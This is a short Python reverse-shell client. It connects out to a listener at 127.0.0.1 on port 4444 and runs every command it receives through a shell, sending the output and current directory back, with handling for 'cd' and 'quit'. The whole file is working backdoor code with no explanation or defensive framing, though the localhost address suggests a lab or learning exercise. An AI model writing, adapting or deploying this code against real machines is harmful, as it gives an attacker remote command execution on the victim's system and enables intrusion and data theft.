import socket
import os
import subprocess
import sys


class Client(object):

    def __init__(self):
        self.target_host = '127.0.0.1'
        self.target_port = 4444
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.target_host, self.target_port))

    def main(self):
        while True:
            data = self.client.recv(1024).decode('utf-8')
            if data == 'quit':
                print("quitting...")
                self.client.close()
                sys.exit()
            if data[:2] == 'cd':
                os.chdir(data[3:])
            if len(data) > 0:
                command = subprocess.Popen(
                    data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                )
                output_bytes = command.stdout.read()
                output_str = str(output_bytes, "utf-8")
                self.client.send(str.encode(str(os.getcwd()) + '$ ' + output_str))


if __name__ == '__main__':
    client = Client()
    client.main()
